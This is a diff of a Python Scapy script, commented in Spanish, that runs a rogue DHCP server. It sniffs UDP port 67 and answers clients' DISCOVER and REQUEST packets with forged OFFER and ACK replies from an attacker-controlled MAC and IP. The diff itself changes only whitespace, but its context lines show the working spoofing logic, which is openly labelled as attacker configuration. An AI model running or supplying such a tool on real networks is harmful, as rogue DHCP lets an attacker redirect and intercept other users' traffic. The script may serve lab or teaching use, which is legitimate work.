@@ -1,4 +1,3 @@
-
 from scapy.all import sniff, Ether, IP, UDP, BOOTP, DHCP, sendp
 
 # CONFIGURACIÓN DEL ATACANTE
@@ -21,7 +20,7 @@ def procesar_dhcp(paquete):
     # 1. SI ES UN DHCP DISCOVER -> RESPONDEMOS CON DHCP OFFER
     if tipo_mensaje == 1:
         print(f"[+] DISCOVER detectado desde MAC: {mac_cliente}. Enviando Fake OFFER...")
-
+        
         falsa_oferta = (
             Ether(src=ATTACKER_MAC, dst=mac_cliente) /
             IP(src=FAKE_SERVER_IP, dst="255.255.255.255") /
@@ -41,7 +40,7 @@ def procesar_dhcp(paquete):
     # 2. SI ES UN DHCP REQUEST -> RESPONDEMOS CON DHCP ACK
     elif tipo_mensaje == 3:
         print(f"[+] REQUEST detectado desde MAC: {mac_cliente}. Enviando Fake ACK...")
-
+        
         falso_ack = (
             Ether(src=ATTACKER_MAC, dst=mac_cliente) /
             IP(src=FAKE_SERVER_IP, dst="255.255.255.255") /
@@ -63,3 +62,4 @@ if __name__ == "__main__":
     print(f"[*] Servidor DHCP falso escuchando activamente en {INTERFACE}...")
     # Escuchamos en el puerto 67 UDP (tráfico destinado a servidores DHCP)
     sniff(filter="udp port 67", prn=procesar_dhcp, iface=INTERFACE, store=0)
+    
